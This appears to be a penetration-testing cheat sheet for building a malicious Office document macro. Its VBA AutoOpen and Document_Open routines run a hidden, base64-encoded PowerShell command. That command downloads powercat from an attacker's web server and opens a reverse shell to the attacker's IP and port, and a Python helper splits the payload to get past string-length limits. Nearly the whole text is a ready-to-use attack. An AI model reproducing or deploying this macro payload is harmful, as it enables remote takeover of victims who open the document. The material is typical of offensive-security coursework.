# MACROS
```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```


base64 encode powercat
must be split into smaller chunks as there is a 255 char limit, this limit does not apply to vars, concat strings with python

encode in powershell / pwsh
```powershell
#powershell 

$text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://[attacker ip]:[attacker http server port]/powercat.ps1");powercat -c [attacker ip] -p [attacker shell listening port] -e powershell'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```

```python
#python script to split up string, must have no linebreaks
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

final payload
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "wAgADEAOQAyAC4AMQA2ADgALgA1ADAALgAxADEAMQAgAC0AcAA"
        Str = Str + "gADkAOQA5ADkAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```